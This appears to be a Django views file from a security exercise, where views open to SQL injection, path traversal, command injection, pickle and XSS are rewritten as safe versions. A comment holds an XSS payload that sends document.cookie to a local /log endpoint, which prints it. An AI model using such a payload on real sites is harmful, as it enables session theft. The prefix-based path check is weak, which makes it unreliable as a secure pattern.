import json
import os
from pathlib import Path

from django.http import HttpResponse, JsonResponse
from django.utils.html import escape
from django.template import Context, Template

from security.models import User


def unsafe_users(request, user_id):
    """Safe version - uses parameterized query"""
    # Используем параметризованный запрос для предотвращения SQL injection
    try:
        user_id_int = int(user_id)  # Валидация типа
        users = User.objects.raw('SELECT * FROM security_user WHERE id = %s', (user_id_int,))
        return HttpResponse(users)
    except (ValueError, TypeError):
        return HttpResponse("Invalid user ID", status=400)


# http://127.0.0.1:8000/security/safe/users/1
def safe_users(request, user_id):
    """Safe version - uses parameterized query with validation"""
    try:
        user_id_int = int(user_id)  # Валидация типа
        users = User.objects.raw('SELECT * FROM security_user WHERE id = %s', (user_id_int,))
        return HttpResponse(users)
    except (ValueError, TypeError):
        return HttpResponse("Invalid user ID", status=400)


def read_file(request, filename):
    """Safe version - validates path to prevent path traversal"""
    
    # Базовый каталог для безопасного чтения файлов
    BASE_DIR = Path(__file__).resolve().parent.parent.parent
    SAFE_DIR = BASE_DIR / 'safe_files'
    
    # Нормализуем путь и проверяем, что он внутри SAFE_DIR
    try:
        # Создаем абсолютный путь
        file_path = (SAFE_DIR / filename).resolve()
        
        # Проверяем, что путь находится внутри SAFE_DIR (защита от path traversal)
        if not str(file_path).startswith(str(SAFE_DIR.resolve())):
            return HttpResponse("Access denied: Invalid path", status=403)
        
        # Проверяем существование файла
        if not file_path.exists() or not file_path.is_file():
            return HttpResponse("File not found", status=404)
        
        # Читаем файл
        with open(file_path, 'r', encoding='utf-8') as f:
            return HttpResponse(f.read())
    except (ValueError, OSError) as e:
        return HttpResponse(f"Error reading file: {str(e)}", status=400)


def copy_file(request, filename):
    """Safe version - uses shutil instead of os.system"""
    import shutil
    
    # Базовый каталог для безопасных операций
    BASE_DIR = Path(__file__).resolve().parent.parent.parent
    SAFE_DIR = BASE_DIR / 'safe_files'
    
    try:
        # Валидация и нормализация пути
        source_path = (SAFE_DIR / filename).resolve()
        dest_path = (SAFE_DIR / f'new_{filename}').resolve()
        
        # Проверяем, что пути находятся внутри SAFE_DIR
        if not str(source_path).startswith(str(SAFE_DIR.resolve())):
            return HttpResponse("Access denied: Invalid source path", status=403)
        if not str(dest_path).startswith(str(SAFE_DIR.resolve())):
            return HttpResponse("Access denied: Invalid destination path", status=403)
        
        # Проверяем существование исходного файла
        if not source_path.exists() or not source_path.is_file():
            return HttpResponse("Source file not found", status=404)
        
        # Используем shutil.copy вместо os.system
        shutil.copy(source_path, dest_path)
        return HttpResponse("File copied successfully")
    except (ValueError, OSError, shutil.Error) as e:
        return HttpResponse(f"Error copying file: {str(e)}", status=400)


# Удален небезопасный код с pickle
# Теперь используется Django authentication для проверки прав доступа

def admin_index(request):
    """Safe version - uses Django authentication instead of insecure deserialization"""
    # Используем Django authentication вместо небезопасной десериализации
    if not request.user.is_authenticated:
        return HttpResponse('Please log in', status=401)
    
    # Проверяем права администратора через Django permissions
    if not request.user.is_staff:
        return HttpResponse('No access: Admin privileges required', status=403)
    
    return HttpResponse('Hello Admin')


# http://127.0.0.1:8000/security/search?query=%3Cscript%3Enew%20Image().src=%22http://127.0.0.1:8000/security/log?string=%22.concat(document.cookie)%3C/script%3E
def search(request):
    """Safe version - escapes user input to prevent XSS"""
    query = request.GET.get('query', '')
    
    # Экранируем пользовательский ввод для предотвращения XSS
    safe_query = escape(query)
    
    # Используем шаблон Django для безопасного рендеринга
    template = Template("Query: {{ query }}")
    context = Context({'query': safe_query})
    
    response = HttpResponse(template.render(context))
    
    # Включаем защиту от XSS
    response['X-XSS-Protection'] = '1; mode=block'
    response['Content-Security-Policy'] = "default-src 'self'"
    
    return response

def log(request):
    """Just print whatever was received"""
    string = request.GET.get('string', '')

    print(string)

    return HttpResponse()
